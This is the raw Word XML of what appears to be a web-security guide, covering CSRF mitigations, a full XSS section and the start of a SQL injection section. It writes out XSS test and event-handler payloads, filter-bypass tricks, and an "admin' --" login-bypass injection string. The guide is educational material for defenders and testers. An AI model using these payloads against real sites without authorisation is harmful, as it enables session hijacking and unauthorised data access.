          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Browsers restrict cross-site POSTs with custom headers unless CORS explicitly allows.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t xml:space="preserve">5. Avoid Cookie-Based </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Prefer token-based authentication (e.g., JWT in Authorization header).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>6. Confirm Sensitive Actions:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Force re-authentication for critical actions (password prompt, MFA).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Add click-to-confirm steps (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nonces</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or dialogs).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0B36C9" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="00212750">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="137" w:name="_Toc208408608"/>
      <w:r>
        <w:t>Cross-Site Scripting (XSS)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="137"/>
    </w:p>
    <w:p w14:paraId="1F418DF2" w14:textId="019E215C" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="00212750">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="138" w:name="_Toc208408609"/>
      <w:r>
        <w:t>Definition &amp; Why It Exists</w:t>
      </w:r>
      <w:bookmarkEnd w:id="138"/>
    </w:p>
    <w:p w14:paraId="30EF36FC" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="00212750">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting (XSS) occurs when untrusted user input is inserted into a web page’s HTML/JavaScript without proper escaping or sanitization. The browser executes attacker-supplied code in the context of a victim’s session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641D329E" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="00212750">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="139" w:name="_Toc208408610"/>
      <w:r>
        <w:t>1.2 Threat Model &amp; Impact</w:t>
      </w:r>
      <w:bookmarkEnd w:id="139"/>
    </w:p>
    <w:p w14:paraId="42002D3E" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker injects a malicious script through a vulnerable parameter or stored field.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4749BD6C" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>The victim’s browser executes this script in their session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5C7771" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Impact includes</w:t>
      </w:r>
      <w:r w:rsidR="009B1E6F">
        <w:t xml:space="preserve">- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506F4740" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>session hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119F61A3" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>DOM manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E1E1D3" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF token theft</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6943A215" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>fake login forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53400FF3" w14:textId="77777777" w:rsidR="009B1E6F" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>defacement</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D743159" w14:textId="188F79CB" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>self-propagating worms.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D960F9A" w14:textId="6197CC33" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="009B1E6F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="140" w:name="_Toc208408611"/>
      <w:r>
        <w:t>Step-by-Step Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="140"/>
    </w:p>
    <w:p w14:paraId="3B1AA555" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Reflection Test → Input a unique string in a parameter and check if it appears </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unescaped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603CB347" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Script Injection → Insert &lt;script&gt;alert(1)&lt;/script&gt; and look for execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653574FA" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Attribute/Event Injection → Break out of attributes, e.g., &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=’’ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=alert(1)&gt;.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C46627D" w14:textId="3250EA33" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">DOM-Based XSS → Search </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DevTools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for dangerous sinks like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533D195F" w14:textId="62E80D5A" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="00D03818">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="141" w:name="_Toc208408612"/>
      <w:r>
        <w:t>Example Payloads</w:t>
      </w:r>
      <w:bookmarkEnd w:id="141"/>
    </w:p>
    <w:p w14:paraId="39248DD8" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Reflected test: &lt;script&gt;alert(“XSS”)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231125D9" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>HTML Injection: &lt;h1&gt;[PAYLOAD]&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A3BA91" w14:textId="77777777" w:rsidR="00D03818" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Event Handler: &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=[PAYLOAD]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD4FA34" w14:textId="6EB609D2" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">DOM Injection: #&lt;svg </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=[PAYLOAD]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB1FE2F" w14:textId="77777777" w:rsidR="0091031D" w:rsidRDefault="00212750" w:rsidP="0091031D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="142" w:name="_Toc208408613"/>
      <w:r>
        <w:t>Advanced Payload Tricks &amp; Bypass Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="142"/>
    </w:p>
    <w:p w14:paraId="587FC85C" w14:textId="77777777" w:rsidR="0091031D" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Breaking out of &lt;script&gt; blocks with HTML injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4124427C" w14:textId="77777777" w:rsidR="0091031D" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Template injections like {{7*7}}.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5E8B21" w14:textId="77777777" w:rsidR="0091031D" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Encoded payloads (UTF-7, Base64, Hex).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FDDA2D" w14:textId="77777777" w:rsidR="0091031D" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Alternate event handlers (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onmouseover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>onfocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746A2932" w14:textId="34A3B259" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Obfuscation via string concatenation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BB671D" w14:textId="73DB209E" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="0091031D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="143" w:name="_Toc208408614"/>
      <w:r>
        <w:t>Mitigations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="143"/>
    </w:p>
    <w:p w14:paraId="559491FA" w14:textId="77777777" w:rsidR="00987FA0" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>Encode/escape output depending on context (HTML, JS, URL, attributes).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63378615" w14:textId="782F9C85" w:rsidR="00212750" w:rsidRDefault="00212750" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use Content Security Policy (CSP) with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nonces</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or hashes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641FB077" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>- Use frameworks with auto-escaping.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC1A118" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>- Sanitize input with allow-lists.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554DE3B8" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookies &amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HTTPOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> flags.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2825E70E" w14:textId="77777777" w:rsidR="00212750" w:rsidRDefault="00212750">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:t>- Trusted Types API to control DOM sinks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0845D112" w14:textId="5FFB0818" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00167E94">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37B4E342" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="0098101F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:divId w:val="1254969984"/>
        <w:rPr>
          <w:kern w:val="36"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="144" w:name="_Toc208408615"/>
      <w:r>
        <w:t>What is SQL Injection?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="144"/>
    </w:p>
    <w:p w14:paraId="317F2681" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SQL Injection occurs when user input is concatenated into SQL queries without proper validation. Attackers craft payloads to alter query logic, leading to unauthorized data access, modification, or even OS-level execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F5004C" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Example (Login Bypass):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>SELECT * FROM users WHERE username = 'admin' AND password = 'password';</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Injected input: admin' --</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Result: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531950DB" w14:textId="239AA8EB" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="0098101F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="145" w:name="_Toc208408616"/>
      <w:r>
        <w:t>Types of SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="145"/>
    </w:p>
    <w:p w14:paraId="0D3FB4F5" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A) By Result Channel:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600DD4D9" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
